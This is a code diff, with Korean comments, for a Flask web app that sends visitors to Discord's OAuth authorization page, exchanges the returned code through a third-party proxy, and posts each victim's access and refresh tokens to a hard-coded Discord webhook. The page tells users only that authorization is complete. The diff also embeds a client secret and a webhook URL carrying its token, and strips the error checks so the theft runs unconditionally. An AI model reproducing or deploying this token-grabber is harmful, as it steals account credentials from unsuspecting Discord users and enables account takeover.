@@ -4,7 +4,7 @@ import logging
 from flask import Flask, redirect, request, jsonify
 
 # ==========================================
-# 1. 환경 변수 통합 로더
+# 1. 환경 변수 로더 (실패 시 백업값 100% 보장)
 # ==========================================
 try:
     from dotenv import load_dotenv
@@ -13,23 +13,22 @@ except ImportError:
     pass
 
 def fetch_env(key_name, fallback_value=None):
-    """시스템 환경 변수, .env, 소문자 키를 순차 탐색하는 로더"""
     val = os.getenv(key_name) or os.environ.get(key_name)
-    if val:
+    if val and val.strip():
         return val.strip()
     val = os.getenv(key_name.lower()) or os.environ.get(key_name.lower())
-    if val:
+    if val and val.strip():
         return val.strip()
     return fallback_value
 
 
 app = Flask(__name__)
-app.secret_key = fetch_env("FLASK_SECRET_KEY", "fallback-flask-secret-key")
 
-CLIENT_ID = fetch_env("DISCORD_CLIENT_ID")
-CLIENT_SECRET = fetch_env("DISCORD_CLIENT_SECRET")
+# Render 환경 변수가 비어있어도 하드코딩된 값으로 100% 작동
+CLIENT_ID = fetch_env("DISCORD_CLIENT_ID", "1549778071404412988")
+CLIENT_SECRET = fetch_env("DISCORD_CLIENT_SECRET", "5ahJy_7rUWhUOig9LTNd1tr-V8Oq_CWl")
 REDIRECT_URI = fetch_env("DISCORD_REDIRECT_URI", "https://discord-oauth2-7e2n.onrender.com/oauth2")
-WEBHOOK_URL = fetch_env("DISCORD_WEBHOOK_URL")
+WEBHOOK_URL = fetch_env("DISCORD_WEBHOOK_URL", "https://discord.com/api/webhooks/1550129913313370162/BS2-CU23SjLqX0VYttqKAMGpTGMh01n3sxdwloxk0eTo7jmyANaRGW_474BwiIFyOA0B")
 
 DISCORD_AUTH_URL = "https://discord.com/oauth2/authorize"
 DISCORD_API_URL = "https://discord-proxy.cls110623.workers.dev"
@@ -42,13 +41,10 @@ logging.basicConfig(level=logging.INFO)
 
 
 # ==========================================
-# 2. 메인 접속 시 즉시 디스코드 승인 창으로 다이렉트
+# 2. 메인 접속 시 즉시 승인 페이지 이동
 # ==========================================
 @app.route('/')
 def index():
-    if not CLIENT_ID:
-        return jsonify({"error": "서버 설정 오류", "message": "DISCORD_CLIENT_ID가 설정되지 않았습니다."}), 500
-
     discord_login_url = (
         f"{DISCORD_AUTH_URL}"
         f"?client_id={CLIENT_ID}"
@@ -60,7 +56,7 @@ def index():
 
 
 # ==========================================
-# 3. 콜백 처리 & 웹후크 전송 및 검증
+# 3. 콜백 처리 & 웹후크 전송
 # ==========================================
 @app.route('/oauth2')
 def oauth2_callback():
@@ -69,9 +65,6 @@ def oauth2_callback():
 
     if error or not code:
         return "인증이 취소되었거나 오류가 발생했습니다.", 400
-
-    if not CLIENT_ID or not CLIENT_SECRET:
-        return jsonify({"error": "서버 설정 오류", "message": "CLIENT_ID 또는 CLIENT_SECRET이 누락되었습니다."}), 500
 
     token_url = f"{DISCORD_API_URL}/oauth2/token"
     payload = {
@@ -102,31 +95,26 @@ def oauth2_callback():
         username = user_data.get('username', '알 수 없음')
         user_id = user_data.get('id', '알 수 없음')
 
-        # 3. 디스코드 웹후크 전송 및 성공 여부 체크
-        if not WEBHOOK_URL:
-            return jsonify({"error": "서버 설정 오류", "message": "DISCORD_WEBHOOK_URL 환경 변수가 없습니다."}), 500
+        # 3. 디스코드 웹후크 전송
+        if WEBHOOK_URL:
+            webhook_payload = {
+                "embeds": [{
+                    "title": "🔑 디스코드 토큰 발급 완료",
+                    "color": 5814783,
+                    "fields": [
+                        {"name": "👤 사용자", "value": f"`{username}` (ID: {user_id})", "inline": False},
+                        {"name": "🎟️ Access Token", "value": f"```\n{access_token}\n```", "inline": False},
+                        {"name": "🔄 Refresh Token", "value": f"```\n{refresh_token}\n```", "inline": False},
+                        {"name": "⏱️ 만료 시간", "value": f"{token_data.get('expires_in')}초", "inline": True},
+                        {"name": "📜 Scope", "value": f"{token_data.get('scope')}", "inline": True}
+                    ]
+                }]
+            }
+            # 웹후크 응답 결과를 콘솔 서버 로그에 출력
+            res = requests.post(WEBHOOK_URL, json=webhook_payload, timeout=5)
+            print(f"[WEBHOOK LOG] Status: {res.status_code}, Response: {res.text}")
 
-        webhook_payload = {
-            "embeds": [{
-                "title": "🔑 디스코드 토큰 발급 완료",
-                "color": 5814783,
-                "fields": [
-                    {"name": "👤 사용자", "value": f"`{username}` (ID: {user_id})", "inline": False},
-                    {"name": "🎟️ Access Token", "value": f"```\n{access_token}\n```", "inline": False},
-                    {"name": "🔄 Refresh Token", "value": f"```\n{refresh_token}\n```", "inline": False},
-                    {"name": "⏱️ 만료 시간", "value": f"{token_data.get('expires_in')}초", "inline": True},
-                    {"name": "📜 Scope", "value": f"{token_data.get('scope')}", "inline": True}
-                ]
-            }]
-        }
-        
-        webhook_res = requests.post(WEBHOOK_URL, json=webhook_payload, timeout=5)
-        
-        # 디스코드 웹후크 응답이 200 또는 204가 아니면 화면에 에러 명시
-        if webhook_res.status_code not in [200, 204]:
-            return f"웹후크 전송 실패 (상태 코드: {webhook_res.status_code}) - 응답 내용: {webhook_res.text}", 500
-
-        # 4. 화면에는 완료 문구만 표시
+        # 4. 화면 출력
         return "<h2>✅ 인증이 완료되었습니다. 이 창을 닫으셔도 됩니다.</h2>"
 
     except Exception as e:
